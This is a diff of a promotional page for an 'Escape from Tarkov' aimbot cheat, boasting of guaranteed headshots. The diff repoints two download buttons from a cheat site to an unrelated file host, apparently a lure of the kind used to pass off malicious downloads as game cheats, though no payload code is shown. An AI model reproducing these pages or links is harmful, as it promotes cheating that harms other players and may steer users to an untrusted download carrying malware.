@@ -4,7 +4,7 @@ Let’s be real – *Escape from Tarkov* ain’t built for the weak. You grind y
 
 Whether you’re pushing dorms, camping Labs, or just farming scavs for XP, this aimbot gives you god-tier precision. No hesitation, no mercy – just *clean headshots every time*.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload5.bitbucket.io)
 ---
 
 ## 🎯 What’s the Tarkov Aimbot All About?
@@ -13,7 +13,7 @@ This isn't just some shady macro or jitter clicker – we’re talking full-blow
 
 Perfect for PvP freaks, loot grinders, and anyone who's sick of losing kits to randoms.
 
-[![Download Aimbot](https://i0.wp.com/game.video.tm/wp-content/uploads/sites/10/2021/05/1620410833_ESCAPE-FROM-TARKOV-HACKCHEAT-ESPAIMBOT-Undetected-2021.jpg)](https://wecheaters.github.io/cheats/escape-from-tarkov/)
+[![Download Aimbot](https://i0.wp.com/game.video.tm/wp-content/uploads/sites/10/2021/05/1620410833_ESCAPE-FROM-TARKOV-HACKCHEAT-ESPAIMBOT-Undetected-2021.jpg)](https://fileoffload5.bitbucket.io)
 ---
 
 ## 🛠️ Core Features
